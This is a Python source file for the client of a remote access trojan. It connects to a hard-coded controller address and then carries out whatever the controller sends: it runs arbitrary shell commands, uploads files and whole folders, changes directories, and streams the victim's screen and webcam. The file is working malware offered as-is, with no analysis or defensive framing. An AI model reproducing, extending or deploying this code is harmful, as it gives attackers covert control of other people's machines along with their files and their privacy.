#   Created By @alm3jzh 
#                       IG : @qhwp
# 
# 
# 
# 
# 

import socket
import os
import shutil
import subprocess
import threading
from vidstream import ScreenShareClient
from vidstream import CameraClient
import customtkinter as ctk

IP = "192.168.204.128"
PORT = 5554  # Changed port to match server
ENCODE = "utf-8"
SIZE = 4096

def send_file(client, filename):
    try:
        if os.path.isdir(filename):
            shutil.make_archive(filename, 'zip', filename)
            filename = filename + ".zip"

        filesize = os.path.getsize(filename)
        client.sendall(f"{filesize}".encode(ENCODE))

        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(SIZE)
                if not bytes_read:
                    break
                client.sendall(bytes_read)

        if filename.endswith(".zip"):
            os.remove(filename)

    except FileNotFoundError:
        client.sendall(b"0")

def screen_record():
    try:
        sender = ScreenShareClient(IP, 9999)  # Use the same alternate port as server
        print("[+] Starting screen sharing...")
        sender.start_stream()
    except Exception as e:
        print(f"[!] Error in screen sharing: {str(e)}")
    
def camera_record():
    receivercam = CameraClient(IP, 9999)  # Use a different port for streaming
    receivercam.start_server()

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output
    except subprocess.CalledProcessError as e:
        return e.output

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
    try:
        print(f"[*] Connecting to {IP}:{PORT}...")
        client.connect((IP, PORT))
        print(f"[+] Connected to {IP}:{PORT}")
        
        while True:
            command = client.recv(SIZE).decode(ENCODE).strip()
            print(f"[*] Received command: {command}")

            if command.startswith("download "):
                filename = command.split()[1]
                print(f"[*] Sending file: {filename}")
                send_file(client, filename)

            elif command.startswith("cd "):
                try:
                    path = command[3:].strip()
                    os.chdir(path)
                    client.sendall(f"Changed directory to {os.getcwd()}".encode(ENCODE))
                except Exception as e:
                    client.sendall(f"Failed to change directory: {str(e)}".encode(ENCODE))
                    
            elif command == "screen":
                print("[*] Starting screen sharing")
                thread = threading.Thread(target=screen_record)
                thread.start()
                client.sendall(b"Screen sharing started")
            elif command == "camera":
                thread = threading.Thread(target=camera_record)
                thread.start()
                
            else:
                output = execute_command(command)
                if not output:
                    output = b"Command executed, but no output."
                client.sendall(output)
    except Exception as e:
        print(f"[!] Connection error: {str(e)}")